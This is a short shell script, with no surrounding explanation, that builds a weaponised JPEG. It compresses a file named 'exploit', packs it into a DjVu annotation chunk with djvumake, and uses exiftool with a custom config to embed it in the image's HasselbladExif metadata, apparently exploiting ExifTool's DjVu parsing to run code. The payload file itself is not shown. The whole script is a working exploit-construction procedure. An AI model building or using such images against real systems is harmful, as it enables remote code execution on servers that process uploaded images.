mkdir output tmp
bzz exploit tmp/exploit.bzz
djvumake tmp/exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=tmp/exploit.bzz
exiftool -config configfile '-HasselbladExif<=tmp/exploit.djvu' pic.jpg
mv pic.jpg output
cp pic.jpg_o pic.jpg
echo "DONE"
rm -rf tmp
